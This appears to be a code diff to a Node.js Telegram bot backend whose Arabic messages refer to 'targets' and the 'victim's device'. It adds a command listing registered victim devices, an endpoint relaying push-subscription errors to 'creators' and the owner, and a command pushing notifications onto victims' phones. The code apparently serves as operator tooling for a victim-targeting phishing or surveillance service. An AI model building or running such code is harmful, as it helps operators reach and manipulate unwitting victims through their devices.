@@ -273,18 +273,7 @@ function mdEsc(text) {
   return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
 }
 
-// ── Startup notification (max once per 5 minutes) ─────────────────────────────
-setTimeout(() => {
-  const now = Date.now();
-  const lastTs = settings.startup_notify_ts || 0;
-  if (now - lastTs < 5 * 60 * 1000) return;
-  settings.startup_notify_ts = now;
-  saveSettings();
-  backupFileToGH(SETTINGS_FILE, '_data/settings.json');
-  bot.sendMessage(BOT_OWNER,
-    `🟢 البوت اشتغل!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size} | 🎯 الأهداف: ${targets.size}`
-  ).catch(() => {});
-}, 4000);
+// Startup notification disabled
 
 // ── Utilities ─────────────────────────────────────────────────────────────────
 
@@ -773,9 +762,17 @@ bot.on('message', async (msg) => {
     const pUid  = parts.shift();
     const pText = parts.join(" ").trim();
     if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
-    if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.");
+    if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.\n\nأرسل /pushlist لمعرفة الأجهزة المسجّلة.");
     sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
     return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر فوراً على جهاز الضحية`);
+  }
+
+  if (msg.text === "/pushlist") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const keys = Object.keys(pushSubs);
+    if (keys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أجهزة مسجّلة للإشعارات بعد.");
+    const list = keys.map((k,i) => `${i+1}. \`${k}\``).join("\n");
+    return bot.sendMessage(chatId, `🔔 الأجهزة المسجّلة (${keys.length}):\n\n${list}\n\nاستخدم:\n/push [PID] [النص]`, { parse_mode:"Markdown" });
   }
 
   if (msg.text === "/ping") {
@@ -1502,7 +1499,18 @@ let pushSubs = loadJSON(PUSH_FILE, {});   // { pid: { uid, subscription } }
 // Serve VAPID public key to the frontend
 app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));
 
-app.post("/push-subscribe", express.json(), (req, res) => {
+// Push error reporting from client
+app.post("/push-error", (req, res) => {
+  res.send("ok");
+  const uid = req.body.uid || '';
+  const err = req.body.err || 'unknown';
+  if (!uid) return;
+  const tid = parseInt(uid, 36);
+  notify(tid, `⚠️ فشل اشتراك الإشعارات:\n${err}`);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `⚠️ Push error — Creator: ${tid}\n${err}`);
+});
+
+app.post("/push-subscribe", (req, res) => {
   res.send("ok");
   const uid  = req.body.uid  || '';
   const pid  = req.body.pid  || '';
